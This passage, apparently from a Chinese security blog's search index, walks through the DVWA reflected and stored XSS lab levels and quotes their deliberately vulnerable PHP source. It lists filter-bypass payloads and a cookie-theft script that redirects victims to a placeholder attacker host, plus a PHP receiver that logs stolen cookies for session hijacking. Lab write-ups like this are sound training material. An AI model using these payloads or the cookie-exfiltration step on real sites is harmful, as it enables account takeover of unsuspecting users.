] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;//Low Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; # Low 12&lt;script&gt;alert(/xss/)&lt;/script&gt; alert() confirm() prompt() # Medium 嵌套过滤、大小写转换 12&lt;scri&lt;script&gt;pt&gt;&lt;ScrIpT&gt; url 编码 通过诱导受害人点击页面隐藏提交 name 值，访问攻击网站的 php 脚本获取用户 cookie，从而劫持会话。 123&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;需要进行url编码%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E 将保存的 cookie 用于登录被攻击账户 1234&lt;?php$cookie=$_GET[&#x27;cookie&#x27;];file_put_contents(&#x27;cookie.txt&#x27;,$cookie);?&gt; # High script 被过滤 使用其他标签 12&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;iframe onload=alert(1)&gt; # Stored Cross Site Scripting (XSS) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//Stored XSS//Impossible Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt;//Medium Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt;//Low Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; # Low 与反射形类似 # Medium 与反射形类似 # High 与反射形类似","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"},{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"shell","slug":"shell","permalink":"http://example.com/tags/shell/"},{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]}